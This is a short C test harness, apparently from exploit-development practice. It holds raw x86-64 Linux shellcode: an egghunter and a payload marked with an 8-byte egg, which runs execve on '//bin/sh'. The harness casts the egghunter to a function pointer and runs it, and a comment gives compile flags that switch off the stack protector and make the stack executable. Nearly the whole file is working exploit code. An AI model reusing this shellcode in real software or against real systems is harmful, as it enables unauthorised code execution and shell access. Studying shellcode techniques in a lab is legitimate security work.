#include<stdio.h>
#include<string.h>

//compile with: gcc test.c -o test -fno-stack-protector -z execstack

const unsigned char egghunter[] = \
"\x48\x31\xff\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x15\x0f\x05\x3c\xf2\x74\xe8\x48\xb8\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xaf\x75\xe0\xaf\x75\xdd\xff\xe7";

const unsigned char payload[] = \
"\xFC\xFC\xFC\xFC\xFC\xFC\xFC\xFC"
"\xFC\xFC\xFC\xFC\xFC\xFC\xFC\xFC"
"\x48\x31\xc0\x48\x83\xc0\x3b\x4d\x31\xc9\x41\x51\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x41\x51\x48\x89\xe2\x57\x48\x89\xe6\x0f\x05";

main()
{
    printf("Egghunter Shellcode Length:  %zu\n", strlen(egghunter));
    printf("Payload Shellcode Length:  %zu\n", strlen(payload));

    int (*ret)() = (int(*)())egghunter;
    ret();
}
